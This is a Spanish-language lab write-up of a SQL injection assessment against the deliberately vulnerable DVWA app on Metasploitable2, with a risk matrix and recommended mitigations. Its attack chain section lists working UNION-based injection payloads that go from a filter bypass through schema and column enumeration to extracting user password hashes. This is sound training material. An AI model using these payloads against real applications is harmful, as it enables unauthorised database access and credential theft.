# DVWA SQL Injection Assessment – Metasploitable2 Lab

## Descripción

Laboratorio práctico de **Web Application Security** realizado sobre **DVWA (Damn Vulnerable Web Application)** ejecutándose en **Metasploitable2**.

El objetivo del ejercicio fue identificar, validar y documentar una vulnerabilidad **SQL Injection**, demostrando el impacto real sobre una aplicación web vulnerable.

Durante el assessment se realizó:

* Confirmación de SQL Injection.
* Fingerprinting del motor de base de datos.
* Enumeración de schemas y tablas.
* Descubrimiento de columnas.
* Extracción controlada de credenciales.
* Análisis técnico del impacto.
* Definición de mitigaciones defensivas.

---

## Entorno del laboratorio

| Componente       | Tecnología      |
| ---------------- | --------------- |
| Attacker Machine | Kali Linux      |
| Target Machine   | Metasploitable2 |
| Web Application  | DVWA            |
| Web Server       | Apache          |
| Database         | MySQL 5.0.51a   |

---

## Objetivos del ejercicio

* Comprender el funcionamiento interno de SQL Injection.
* Aprender enumeración manual de bases de datos.
* Analizar impacto de vulnerabilidades web.
* Practicar documentación técnica estilo AppSec / SOC Analyst.

---

## Attack Chain

### 1 — SQL Injection Validation

Payload utilizado:

```sql
1' OR '1'='1
```

Resultado:

Bypass exitoso del filtro de consulta SQL.

---

### 2 — Database Fingerprinting

Payload:

```sql
1' UNION SELECT version(),database()#
```

Resultado obtenido:

```txt
MySQL 5.0.51a
dvwa
```

---

### 3 — Schema Enumeration

Payload:

```sql
1' UNION SELECT table_name,table_schema
FROM information_schema.tables#
```

Hallazgos relevantes:

* dvwa.users
* dvwa.guestbook
* mysql.user
* owasp10.credit_cards

---

### 4 — Column Discovery

Payload:

```sql
1' UNION SELECT column_name,table_name
FROM information_schema.columns
WHERE table_name='users'#
```

Columnas identificadas:

* user_id
* first_name
* last_name
* user
* password
* avatar

---

### 5 — Credential Extraction

Payload:

```sql
1' UNION SELECT user,password FROM users#
```

Resultado:

Extracción exitosa de hashes de usuarios.

---

## Risk Matrix

| Finding                   | Severity |
| ------------------------- | -------- |
| SQL Injection             | Critical |
| Credential Exposure       | Critical |
| Weak Hashing (MD5)        | High     |
| Authentication Compromise | High     |

---

## Mitigaciones recomendadas

* Prepared Statements
* Parameterized Queries
* Input Validation
* Least Privilege Database Accounts
* bcrypt / Argon2
* WAF Deployment
* Centralized Logging / SIEM Monitoring

---

## Evidencia

Las capturas y outputs completos se encuentran dentro de:

```txt
Documents/
```

---

## Disclaimer

Laboratorio realizado exclusivamente en entorno controlado con fines educativos.
